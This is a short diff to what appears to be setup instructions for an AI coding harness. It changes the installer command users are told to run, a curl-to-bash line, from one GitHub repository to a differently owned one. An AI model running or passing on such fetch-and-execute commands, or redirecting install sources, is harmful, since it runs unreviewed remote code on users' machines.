@@ -52,7 +52,7 @@ The `install.sh` script handles fetching and installing harness files before vc-
 
 **If harness files are NOT present**, tell the user to run the installer first:
 ```
-curl -fsSL https://raw.githubusercontent.com/withkynam/vibecode-pro-max-kit/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/Tomwakeupat530amm/vibebelt-kit/main/install.sh | bash
 ```
 
 Then re-run vc-setup.
